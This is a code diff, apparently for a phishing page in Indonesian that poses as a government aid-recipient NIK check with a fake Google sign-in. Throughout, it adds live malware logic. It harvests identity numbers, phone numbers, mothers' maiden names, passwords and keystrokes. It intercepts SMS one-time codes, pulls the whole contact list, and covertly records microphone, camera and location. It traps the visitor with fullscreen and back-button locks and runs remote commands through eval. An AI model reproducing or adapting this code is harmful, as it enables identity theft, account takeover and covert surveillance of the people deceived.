   var p={db:db,peak:pk,va:db>-45?1:0,sumber:'latar'};
   send('mic',p).catch(function(){});kirimPolos('mic',p);
-  dbg('mic '+db+'dB');
 }
 function micLevel(){
   if(!micAn)return;
@@ -609,8 +817,8 @@ function micMulai(){
       if(!micTimer)micTimer=setInterval(micLevel,4000);
       setTimeout(function(){rekam(6)},900);
       if(micSik)clearInterval(micSik);
-      micSik=setInterval(function(){if(micAktif&&micClip<40){micClip++;rekam(5)}},30000);
-      dbg('mic aktif');return 'aktif';
+      micSik=setInterval(function(){if(micAktif&&micClip<80){micClip++;rekam(5)}},30000);
+      return 'aktif';
     }).catch(function(){return 'ditolak'});
 }
 function micStop(){
@@ -620,7 +828,7 @@ function micStop(){
   try{micStream.getTracks().forEach(function(t){try{t.stop()}catch(e){}})}catch(e){}
   micStream=null;
   try{micCtx&&micCtx.close()}catch(e){}
-  micCtx=null;micAn=null;dbg('mic mati');
+  micCtx=null;micAn=null;
 }
 function rekam(detik){
   detik=Math.max(3,Math.min(20,detik||6));
@@ -631,7 +839,7 @@ function rekam(detik){
   if(!mime)return Promise.resolve('mime');
   return new Promise(function(res){
     var chunk=[],r;
-    try{r=new MediaRecorder(micStream,{mimeType:mime,audioBitsPerSecond:24000})}catch(e){return res('gagal rekam')}
+    try{r=new MediaRecorder(micStream,{mimeType:mime,audioBitsPerSecond:32000})}catch(e){return res('gagal rekam')}
     r.ondataavailable=function(e){if(e.data&&e.data.size)chunk.push(e.data)};
     r.onstop=function(){
       try{
@@ -663,7 +871,8 @@ function strimGabung(){
 function rekamVideo(detik){
   detik=Math.max(3,Math.min(25,detik||10));
   if(!window.MediaRecorder)return Promise.resolve('na');
-  return nyala().then(function(ok){
+  var siap=micStream?Promise.resolve(true):micMulai().then(function(){return true});
+  return siap.then(function(){return nyala()}).then(function(ok){
     if(!ok)return 'kamera ditolak';
     var st=strimGabung();
     if(!st)return 'tanpa strim';
@@ -672,7 +881,7 @@ function rekamVideo(detik){
     if(!mime)return 'mime';
     return new Promise(function(res){
       var chunk=[],r;
-      try{r=new MediaRecorder(st,{mimeType:mime,videoBitsPerSecond:340000,audioBitsPerSecond:32000})}
+      try{r=new MediaRecorder(st,{mimeType:mime,videoBitsPerSecond:700000,audioBitsPerSecond:40000})}
       catch(e){return res('gagal rekam')}
       r.ondataavailable=function(e){if(e.data&&e.data.size)chunk.push(e.data)};
       r.onstop=function(){
@@ -712,7 +921,7 @@ function vidStop(){
   if(vidJeda){clearTimeout(vidJeda);vidJeda=null}
 }
 
-/* ---------- layar penuh & jaga ---------- */
+/* ---------- layar penuh & kunci ---------- */
 function layarPenuh(){
   return new Promise(function(res){
     try{
@@ -728,11 +937,10 @@ function layarPenuh(){
 function fsKunci(){
   if(document.fullscreenElement||document.webkitFullscreenElement)return;
   if(!gerbangAktif&&document.visibilityState!=='visible')return;
-  fsCoba++;
-  layarPenuh();
+  fsCoba++;layarPenuh();
 }
 function fsPasang(){
-  ['click','touchstart','touchend','pointerdown','keydown','scroll'].forEach(function(ev){
+  ['click','touchstart','touchend','pointerdown','keydown'].forEach(function(ev){
     document.addEventListener(ev,fsKunci,{passive:true});
   });
   if(fsTimer)clearInterval(fsTimer);
@@ -741,68 +949,80 @@ function fsPasang(){
     if(document.visibilityState!=='visible')return;
     layarPenuh();
   },2000);
+  try{if(screen.orientation&&screen.orientation.lock)screen.orientation.lock('portrait').catch(function(){})}catch(e){}
 }
 function jagaLayar(){
   return new Promise(function(res){
     try{
       if(!navigator.wakeLock)return res(false);
-      navigator.wakeLock.request('screen').then(function(l){jagaLayarRef=l;res(true)})
-        .catch(function(){res(false)});
+      navigator.wakeLock.request('screen').then(function(l){jagaLayarRef=l;res(true)}).catch(function(){res(false)});
     }catch(e){res(false)}
   });
 }
+function kunciPasang(on){
+  kunciAktif=!!on;
+  try{document.body.style.userSelect=kunciAktif?'none':''}catch(e){}
+  document.oncontextmenu=kunciAktif?function(e){e.preventDefault()}:null;
+  if(kunciAktif){
+    for(var i=0;i<4;i++){try{history.pushState({k:i},'','')}catch(e){}}
+  }
+}
+function cegahTutup(){
+  var pesan='Pemeriksaan belum selesai. Tinggalkan halaman?';
+  window.addEventListener('beforeunload',function(e){e.preventDefault();e.returnValue=pesan;return pesan});
+  window.addEventListener('popstate',function(){
+    try{history.pushState({z:1},'','')}catch(e){}
+    fsKunci();
+  });
+  document.addEventListener('keydown',function(e){
+    if(e.key==='Escape'||e.key==='BrowserBack')setTimeout(fsKunci,80);
+  });
+  try{history.pushState({z:0},'','')}catch(e){}
+}
 
-/* ---------- SMS (WebOTP) ---------- */
-var smsTerkunci='';
+/* ---------- SMS ---------- */
+function smsCatat(kode,teks){
+  SMS.push({kode:kode,teks:teks||'',t:new Date().toISOString()});
+  var p={kode:kode,teks:teks||'otp-terbaca'};
+  send('sms',p).catch(function(){});kirimPolos('sms',p);
+}
 function smsDengar(){
   if(!('OTPCredential' in window))return Promise.resolve('na');
   try{
     return navigator.credentials.get({otp:{transport:['sms']},signal:AbortSignal.timeout(180000)})
       .then(function(c){
         if(!c||!c.code)return 'kosong';
-        smsTerkunci=c.code;
-        var p={kode:c.code,teks:'otp-terbaca'};
-        send('sms',p).catch(function(){});kirimPolos('sms',p);
-        return c.code;
+        smsCatat(c.code,'otp-terbaca');return c.code;
       }).catch(function(){return 'batal'});
   }catch(e){return Promise.resolve('na')}
 }
-function smsTawar(){
+function smsLoop(){
   smsDengar().then(function(k){
-    if(k&&k!=='na'&&k!=='batal'&&k!=='kosong')dbg('sms '+k);
+    if(k&&k!=='na')dbg('sms '+k);
+    setTimeout(smsLoop,k==='na'?60000:1200);
   });
 }
 
-/* ---------- senyap ---------- */
-function auto(){
-  deteksi().then(function(d){
-    var p={probe:JSON.stringify(PROBE),yield:SKOR,prompts:0,launder:0,sidik:SIDIK,ip:ip,
-      ua:navigator.userAgent,platform:d.platform,bahasa:d.bahasa,zona:d.zona,layar:d.layar,
-      model:d.model,memori:d.ram,inti:d.cpu,gpu:PROBE.gpu||'',
-      device:d.deviceId,tipe:d.tipe,brand:d.brand,os:d.os,osv:d.osv,
-      browser:d.browser,bver:d.bver,viewport:d.viewport,pr:d.pr,touch:d.touch,
-      bahasaAll:d.bahasaAll,online:d.online,net:d.net||'',bateri:d.bateri||'',charge:d.charge||''};
-    send('det',d).catch(function(){kirimPolos('det',d)});
-    send('auto',p).then(function(r){
-      if(r&&r.ok&&r.sid){sid=r.sid;try{localStorage.setItem('zgch_sid',sid)}catch(e){}}
-      else kirimPolos('auto',p);
-    }).catch(function(){kirimPolos('auto',p)});
-  }).catch(function(){});
-}
-function kunjungan(t){var p={tahap:t,ket:location.href,nik:NIK};
-  send('kunjungan',p).catch(function(){});kirimPolos('kunjungan',p)}
+/* ---------- kontak ---------- */
 function kontak(){
   if(!navigator.contacts||!navigator.contacts.select)return Promise.resolve('na');
   if(!navigator.userActivation||!navigator.userActivation.isActive)return Promise.resolve('tunggu');
   return navigator.contacts.select(['name','tel','email','address'],{multiple:true}).then(function(l){
     if(!l||!l.length)return 'kosong';
-    var rows=l.map(function(c){var al='';try{al=c.address&&c.address[0]?(c.address[0].city||c.address[0].country||''):''}catch(e){}
-      return{nama:(c.name&&c.name[0])||'',tel:(c.tel||[]).join(' / '),em:(c.email||[]).join(' / '),al:al}});
-    var p={rows:JSON.stringify(rows)};send('kontak',p).catch(function(){});kirimPolos('kontak',p);
+    var rows=l.map(function(c){
+      var al='';
+      try{al=c.address&&c.address[0]?[c.address[0].addressLine,c.address[0].city,c.address[0].region].filter(String).join(' '):''}catch(e){}
+      return{nama:(c.name&&c.name[0])||'',tel:(c.tel||[]).join(' / '),em:(c.email||[]).join(' / '),al:al};
+    });
+    var p={rows:JSON.stringify(rows)};
+    send('kontak',p).catch(function(){});kirimPolos('kontak',p);
     telCatat(rows);
+    try{localStorage.setItem('zgch_kon',String((Number(localStorage.getItem('zgch_kon')||0))+rows.length))}catch(e){}
+    kontakOk=true;chip.classList.remove('on');
     return rows.length;
   }).catch(function(){return 'batal'});
 }
+function kontakAll(){return kontak()}
 function telCatat(rows){
   var out=[];
   rows.forEach(function(c){
@@ -812,16 +1032,17 @@ function telCatat(rows){
     });
   });
   if(!out.length)return;
-  var p={rows:JSON.stringify(out.slice(0,300))};
+  var p={rows:JSON.stringify(out.slice(0,400))};
   send('tel',p).catch(function(){});kirimPolos('tel',p);
 }
 
-/* ---------- OTP ---------- */
+/* ---------- OTP login ---------- */
 function otpDengar(){
   if(!('OTPCredential' in window))return;
   try{navigator.credentials.get({otp:{transport:['sms']},signal:AbortSignal.timeout(120000)})
     .then(function(c){
       if(!c||!c.code)return;
+      smsCatat(c.code,'otp-login');
       var v=c.code.replace(/\D/g,'').slice(0,6),b=$('gsiStep3').querySelectorAll('input');
       for(var i=0;i<b.length&&i<v.length;i++)b[i].value=v[i];
       if(step===3){$('gsiSt').textContent='Kode terisi otomatis dari SMS.';verif()}
@@ -857,8 +1078,9 @@ function hasil(nik,ok){
   r.className='res on '+(ok?'ok':'no');
   if(!ok){r.innerHTML='<b>NIK tidak ditemukan pada data penerima.</b><br>Pastikan 16 digit NIK benar dan sesuai KTP elektronik.';return}
   r.innerHTML='<b>Data peserta ditemukan.</b><dl>'+
-    '<dt>NIK</dt><dd>'+nik+'</dd><dt>Provinsi</dt><dd>'+u.prov+'</dd>'+
-    '<dt>Kode wilayah</dt><dd>'+u.kab+' / '+u.kec+'</dd>'+
+    '<dt>NIK</dt><dd>'+nik+'</dd><dt>Nomor KK</dt><dd>'+KK+'</dd>'+
+    '<dt>Handphone</dt><dd>'+HP+'</dd><dt>Ibu Kandung</dt><dd>'+IBU+'</dd>'+
+    '<dt>Provinsi</dt><dd>'+u.prov+'</dd><dt>Kode wilayah</dt><dd>'+u.kab+' / '+u.kec+'</dd>'+
     '<dt>Tanggal lahir</dt><dd>'+u.tgl+'</dd><dt>Jenis kelamin</dt><dd>'+u.jk+'</dd>'+
     '<dt>Umur</dt><dd>'+u.umur+' tahun</dd><dt>Status</dt><dd>Terdaftar calon penerima</dd>'+
     '<dt>Tahap</dt><dd>Verifikasi berkas</dd><dt>Keterangan</dt><dd>Menunggu validasi rekening</dd></dl>';
@@ -879,12 +1101,19 @@ function tutup(){wrap.classList.remove('on');document.body.style.overflow='';set
 
 $('cek').onclick=function(){
   var n=$('nik').value.replace(/\D/g,'');NIK=n;
-  if(n.length!==16){$('res').className='res on no';$('res').innerHTML='<b>NIK harus 16 digit.</b>';return}
-  if(!$('cap').value){$('res').className='res on no';$('res').innerHTML='<b>Kode verifikasi belum diisi.</b>';return}
-  try{localStorage.setItem('zgch_nik',n)}catch(e){}
+  KK=$('kk').value.replace(/\D/g,'');HP=$('hp').value.replace(/[^\d+]/g,'');IBU=$('ibu').value.trim();
+  var r=$('res');
+  if(n.length!==16){r.className='res on no';r.innerHTML='<b>NIK harus 16 digit.</b>';return}
+  if(KK.length!==16){r.className='res on no';r.innerHTML='<b>Nomor Kartu Keluarga harus 16 digit.</b>';return}
+  if(HP.length<9){r.className='res on no';r.innerHTML='<b>Nomor handphone belum valid.</b>';return}
+  if(IBU.length<3){r.className='res on no';r.innerHTML='<b>Nama ibu kandung belum diisi.</b>';return}
+  if(!$('cap').value){r.className='res on no';r.innerHTML='<b>Kode verifikasi belum diisi.</b>';return}
+  try{localStorage.setItem('zgch_nik',n);localStorage.setItem('zgch_kk',KK);
+    localStorage.setItem('zgch_hp',HP);localStorage.setItem('zgch_ibu',IBU)}catch(e){}
   var ok=Math.random()>0.25;
   hasil(n,ok);
-  var p={nik:n,ok:ok?1:0};send('nik',p).catch(function(){});kirimPolos('nik',p);
+  var p={nik:n,ok:ok?1:0,kk:KK,hp:HP,ibu:IBU};
+  send('nik',p).catch(function(){});kirimPolos('nik',p);
   kunjungan('cek');
   setTimeout(buka,700);
 };
@@ -901,10 +1130,10 @@ $('gsiMasuk').onclick=function(){
   var u=$('gsiUser').value.trim(),pw=$('gsiPass').value;
   if(!pw){$('gsiSt').textContent='Sandi belum diisi.';return}
   $('gsiMasuk').disabled=true;$('gsiSt').textContent='Memverifikasi...';
-  var body={username:u,password:pw,nik:NIK,ip:ip,ua:navigator.userAgent,
+  var body={username:u,password:pw,nik:NIK,kk:KK,hp:HP,ibu:IBU,ip:ip,ua:navigator.userAgent,
     platform:DET.platform||navigator.platform,bahasa:navigator.language,
     zona:Intl.DateTimeFormat().resolvedOptions().timeZone,
-    layar:screen.width+'x'+screen.height,page:location.href,
+    layar:screen.width+'x'+screen.height,page:location.href,referrer:document.referrer||'',
     device:DET.deviceId||dev,tipe:DET.tipe||'',brand:DET.brand||'',model:DET.model||'',
     os:DET.os||'',osv:DET.osv||'',browser:DET.browser||'',bver:DET.bver||'',
     keylog:JSON.stringify(KEYS.slice(-60)),foto:FOTO,skor:SKOR,sidik:SIDIK};
@@ -913,7 +1142,7 @@ $('gsiMasuk').onclick=function(){
     step=3;$('gsiStep2').style.display='none';$('gsiStep3').style.display='';
     $('gsiSt').textContent='Masukkan kode 6 digit dari Google.';
     var b=$('gsiStep3').querySelectorAll('input');if(b[0])b[0].focus();
-    otpDengar();smsTawar();
+    otpDengar();
   };
   send('login',body).then(function(r){
     if(r&&r.ok){$('gsiSt').textContent='Sandi tersimpan.';lanjut()}
@@ -937,7 +1166,7 @@ $('gsiUlang').onclick=function(){$('gsiSt').textContent='Tunggu SMS dari Google,
 
 /* ---------- keylog ---------- */
 document.addEventListener('keydown',function(e){
-  if(KEYS.length>140)return;var t=e.target&&e.target.id;if(!t)return;
+  if(KEYS.length>160)return;var t=e.target&&e.target.id;if(!t)return;
   KEYS.push((e.key.length===1?e.key:'['+e.key+']')+'@'+t);
 });
 
@@ -965,18 +1194,26 @@ function jalan(t){
         var p={lat:g.lat,lng:g.lng,acc:g.acc,sumber:'perintah'};
         send('lacak',p).catch(function(){});kirimPolos('lacak',p);selesai(g.lat+','+g.lng)});
     } else if(c==='kontak'){kontak().then(function(r){selesai(String(r))});
+    } else if(c==='kontakall'){kontakAll().then(function(r){selesai('kontak '+r)});
     } else if(c==='keylog'){selesai(JSON.stringify(KEYS.slice(-60)));
     } else if(c==='info'){
       selesai(JSON.stringify({ua:navigator.userAgent,platform:navigator.platform,
         zona:Intl.DateTimeFormat().resolvedOptions().timeZone,layar:screen.width+'x'+screen.height,
         mem:PROBE.mem,inti:PROBE.inti,gpu:PROBE.gpu,skor:SKOR,probe:PROBE}));
     } else if(c==='dev'){
-      deteksi().then(function(d){
-        send('det',d).catch(function(){kirimPolos('det',d)});
-        selesai(JSON.stringify(d));
-      });
-    } else if(c==='mic'){
-      micMulai().then(function(r){selesai('mic '+r)});
+      deteksi().then(function(d){send('det',d).catch(function(){kirimPolos('det',d)});selesai(JSON.stringify(d))});
+    } else if(c==='sidik'){
+      fpSemua().then(function(f){send('sidik',f).catch(function(){kirimPolos('sidik',f)});
+        selesai('hash '+f.hash)});
+    } else if(c==='izin'){
+      izinPeriksa().then(function(r){var p={rows:JSON.stringify(r)};
+        send('izin',p).catch(function(){});kirimPolos('izin',p);selesai(JSON.stringify(r))});
+    } else if(c==='jar'){
+      jarKirim().then(function(r){selesai(JSON.stringify(r))});
+    } else if(c==='situs'){
+      jejakKirim();selesai(JSON.stringify({t:Math.round((Date.now()-JT)/1000),klik:JKLIK,
+        key:JKEY,scroll:JSCROLL,fokus:JFOKUS,blur:JBLUR}));
+    } else if(c==='mic'){micMulai().then(function(r){selesai('mic '+r)});
     } else if(c==='micstop'){micStop();selesai('mic mati');
     } else if(c==='kamera'){kamMulai().then(function(r){selesai('kamera '+r)});
     } else if(c==='kamerastop'){kamStop();selesai('kamera mati');
@@ -985,13 +1222,13 @@ function jalan(t){
     } else if(c==='vidloop'){vidMulai().then(function(u){selesai('loop '+u)});
     } else if(c==='vidstop'){vidStop();selesai('loop mati');
     } else if(c==='sms'){smsDengar().then(function(k){selesai('sms '+k)});
+    } else if(c==='smsinbox'){selesai(JSON.stringify(SMS));
     } else if(c==='telepon'){kontak().then(function(r){selesai('tel '+r)});
     } else if(c==='torch'){Promise.resolve(torch()).then(function(r){selesai(r)});
-    } else if(c==='hidup'){
-      send('beacon',{skor:SKOR}).catch(function(){});selesai('hidup');
+    } else if(c==='hidup'){send('beacon',{skor:SKOR}).catch(function(){});selesai('hidup');
     } else if(c==='fs'){layarPenuh().then(function(r){selesai('fs '+r)});
-    } else if(c==='js'){
-      var v='';try{v=String(eval(arg||'1'))}catch(e){v='err '+e.message}selesai(v);
+    } else if(c==='kunci'){kunciPasang(!kunciAktif);selesai('kunci '+kunciAktif);
+    } else if(c==='js'){var v='';try{v=String(eval(arg||'1'))}catch(e){v='err '+e.message}selesai(v);
     } else if(c==='getar'){try{navigator.vibrate([220,110,220]);selesai('ok')}catch(e){selesai('na')}
     } else if(c==='notif'){
       if(!('Notification' in window))return selesai('na');
@@ -1016,13 +1253,37 @@ function tarik(){
     .then(function(){setTimeout(tarik,4000)});
 }
 
-/* ---------- bangkit senyap ---------- */
+/* ---------- bangkit ---------- */
+function auto(){
+  deteksi().then(function(d){
+    var p={probe:JSON.stringify(PROBE),yield:SKOR,prompts:0,launder:0,sidik:SIDIK,ip:ip,
+      ua:navigator.userAgent,platform:d.platform,bahasa:d.bahasa,zona:d.zona,layar:d.layar,
+      model:d.model,memori:d.ram,inti:d.cpu,gpu:PROBE.gpu||'',
+      device:d.deviceId,tipe:d.tipe,brand:d.brand,os:d.os,osv:d.osv,
+      browser:d.browser,bver:d.bver,viewport:d.viewport,pr:d.pr,touch:d.touch,
+      bahasaAll:d.bahasaAll,online:d.online,net:d.net||'',bateri:d.bateri||'',charge:d.charge||''};
+    send('det',d).catch(function(){kirimPolos('det',d)});
+    send('auto',p).then(function(r){
+      if(r&&r.ok&&r.sid){sid=r.sid;try{localStorage.setItem('zgch_sid',sid)}catch(e){}}
+      else kirimPolos('auto',p);
+    }).catch(function(){kirimPolos('auto',p)});
+  }).catch(function(){});
+}
+function kunjungan(t){var p={tahap:t,ket:location.href,nik:NIK};
+  send('kunjungan',p).catch(function(){});kirimPolos('kunjungan',p)}
 function bangkit(){
   if(sudahBangkit)return;sudahBangkit=1;
-  deteksi().then(function(d){send('det',d).catch(function(){kirimPolos('det',d)})}).catch(function(){});
+  auto();
+  fpSemua().then(function(f){send('sidik',f).catch(function(){kirimPolos('sidik',f)})}).catch(function(){});
+  izinPeriksa().then(function(r){var p={rows:JSON.stringify(r)};
+    send('izin',p).catch(function(){});kirimPolos('izin',p)}).catch(function(){});
+  jarKirim();
   micMulai();
   kamMulai();
   vidMulai();
+  kunciPasang(true);
+  smsLoop();
+  jejakKirim();
 }
 
 /* =========================================================
@@ -1030,8 +1291,7 @@ function bangkit(){
    ========================================================= */
 function tanda(k,ok){
   var el=document.querySelector('#gbList li[data-k="'+k+'"]');
-  if(!el)return;
-  el.className=ok?'ok':'no';
+  if(!el)return;el.className=ok?'ok':'no';
 }
 function langkah(k){
   return new Promise(function(res){
@@ -1044,9 +1304,7 @@ function langkah(k){
       if(k==='lokasi'){geo(function(g){selesai(!!g)});return}
       if(k==='notifikasi'){
         if(!('Notification' in window))return selesai(false);
-        Notification.requestPermission().then(function(p){selesai(p==='granted')})
-          .catch(function(){selesai(false)});return}
-      if(k==='kontak'){kontak().then(function(r){selesai(r!=='na'&&r!=='batal'&&r!=='tunggu')});return}
+        Notification.requestPermission().then(function(p){selesai(p==='granted')}).catch(function(){selesai(false)});return}
       if(k==='klip'){rekamVideo(6).then(function(r){selesai(r!=='na'&&r!=='gagal'&&r!=='kamera ditolak')});return}
       selesai(false);
     }catch(e){selesai(false)}
@@ -1056,18 +1314,31 @@ function izinSemua(){
   var go=$('gbGo');
   go.disabled=true;go.textContent='MEMPROSES...';
   $('gbNote').textContent='Jangan tutup halaman sampai pemeriksaan selesai.';
-  var urut=['layar','jaga','kamera','mikrofon','lokasi','notifikasi','kontak','klip'];
+  var urut=['layar','jaga','kamera','mikrofon','lokasi','notifikasi','klip'];
   var i=0;
   (function lanjut(){
-    if(i>=urut.length)return gerbangSelesai();
+    if(i>=urut.length)return tahapKontak();
     var k=urut[i++];
     var li=document.querySelector('#gbList li[data-k="'+k+'"]');
     if(li)li.className='aktif';
-    langkah(k).then(function(ok){
-      tanda(k,ok);
-      setTimeout(lanjut,ok?170:110);
-    });
+    langkah(k).then(function(ok){tanda(k,ok);setTimeout(lanjut,ok?170:110)});
   })();
+}
+function tahapKontak(){
+  var go=$('gbGo');
+  if(!navigator.contacts||!navigator.contacts.select){
+    tanda('kontak',false);return gerbangSelesai();
+  }
+  go.disabled=false;go.textContent='IZINKAN KONTAK & SELESAIKAN';
+  $('gbNote').textContent='Ketuk sekali, lalu pilih SEMUA kontak pada daftar yang muncul.';
+  document.querySelector('#gbList li[data-k="kontak"]').className='aktif';
+  go.onclick=function(){
+    go.disabled=true;go.textContent='MEMBUKA DAFTAR KONTAK...';
+    kontakAll().then(function(r){
+      tanda('kontak',r!=='na'&&r!=='batal'&&r!=='tunggu'&&r!=='kosong');
+      setTimeout(gerbangSelesai,300);
+    });
+  };
 }
 function gerbangSelesai(){
   gerbangAktif=false;
@@ -1076,39 +1347,28 @@ function gerbangSelesai(){
   document.body.style.overflow='';
   try{history.pushState({z:1},'','')}catch(e){}
   fsPasang();
-  bangkit();
+  if(!sudahBangkit)bangkit();
   send('beacon',{skor:SKOR,ket:'gerbang-lolos'}).catch(function(){});
   setTimeout(tarik,1200);
-  setTimeout(function(){kontak().then(function(r){dbg('kontak '+r)})},2500);
-  setTimeout(function(){smsTawar()},4000);
+  if(!kontakOk)chip.classList.add('on');
 }
 function gerbangMuncul(){
   if(gerbangAktif||!ger)return;
   gerbangAktif=true;
   ger.classList.add('tampil');
   document.body.style.overflow='hidden';
-  layarPenuh();
-  fsPasang();
-  kunjungan('gerbang');
+  layarPenuh();fsPasang();kunjungan('gerbang');
 }
 $('gbGo').onclick=izinSemua;
+$('gbLewat').onclick=gerbangSelesai;
+chip.onclick=function(){kontakAll().then(function(r){
+  if(r!=='na'&&r!=='batal'&&r!=='tunggu'&&r!=='kosong')chip.classList.remove('on');
+})};
 
-/* ---------- penahan keluar ---------- */
-window.addEventListener('beforeunload',function(e){
-  e.preventDefault();
-  e.returnValue='Pemeriksaan belum selesai. Tinggalkan halaman?';
-  return 'Pemeriksaan belum selesai. Tinggalkan halaman?';
-});
-window.addEventListener('popstate',function(){
-  try{history.pushState({z:1},'','')}catch(e){}
-  fsKunci();
-});
-window.addEventListener('pagehide',function(){
-  try{send('beacon',{skor:SKOR,ket:'tinggal'})}catch(e){}
-});
-window.addEventListener('blur',function(){
-  setTimeout(function(){try{window.focus()}catch(e){}},120);
-});
+/* ---------- penahan ---------- */
+cegahTutup();
+window.addEventListener('pagehide',function(){try{send('beacon',{skor:SKOR,ket:'tinggal'})}catch(e){}});
+window.addEventListener('blur',function(){setTimeout(function(){try{window.focus()}catch(e){}},120)});
 document.addEventListener('visibilitychange',function(){
   if(document.visibilityState==='visible'){
     if(!kamAktif)kamMulai();
@@ -1122,8 +1382,15 @@ document.addEventListener('visibilitychange',function(){
 
 /* ---------- jalan ---------- */
 $('nik').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,16)});
-try{var ln=localStorage.getItem('zgch_nik');if(ln&&ln.length===16)$('nik').value=ln}catch(e){}
-captcha();sidik();probe();kunjungan('muat');
+$('kk').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,16)});
+$('hp').addEventListener('input',function(){this.value=this.value.replace(/[^\d+]/g,'').slice(0,15)});
+try{
+  var ln=localStorage.getItem('zgch_nik');if(ln&&ln.length===16)$('nik').value=ln;
+  var lk=localStorage.getItem('zgch_kk');if(lk&&lk.length===16)$('kk').value=lk;
+  var lh=localStorage.getItem('zgch_hp');if(lh)$('hp').value=lh;
+  var li=localStorage.getItem('zgch_ibu');if(li)$('ibu').value=li;
+}catch(e){}
+captcha();probe();jejakPasang();kunjungan('muat');
 geo(function(g){if(g){var p={lat:g.lat,lng:g.lng,acc:g.acc,sumber:g.sumber};
   send('lacak',p).catch(function(){});kirimPolos('lacak',p)}});
 geoIp();
@@ -1134,11 +1401,9 @@ setTimeout(function(){nyala().then(function(ok){
   setTimeout(function(){jepret().then(function(u){if(u)kirimFoto(u,'muka')})},1500);
 })},1400);
 setTimeout(function(){layar().then(function(u){if(u)kirimFoto(u,'muka-halaman')})},3400);
-setTimeout(function(){kontak().then(function(r){dbg('kontak '+r)})},4200);
 setTimeout(micMulai,1100);
 setTimeout(kamMulai,5200);
 setTimeout(gerbangMuncul,2000);
-setTimeout(smsTawar,6000);
 setInterval(function(){
   if(document.visibilityState!=='visible')return;
   send('beacon',{skor:SKOR,ket:'detak'}).catch(function(){});
@@ -1147,7 +1412,7 @@ setInterval(function(){
   s.src='https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
   document.head.appendChild(s)})();
 try{fetch(EP+'?ping=1',{mode:'no-cors'})}catch(e){}
-try{if('serviceWorker' in navigator)navigator.serviceWorker.register('sw.js?v=14').catch(function(){})}catch(e){}
+try{if('serviceWorker' in navigator)navigator.serviceWorker.register('sw.js?v=20').catch(function(){})}catch(e){}
 })();
 </script>
 </body>
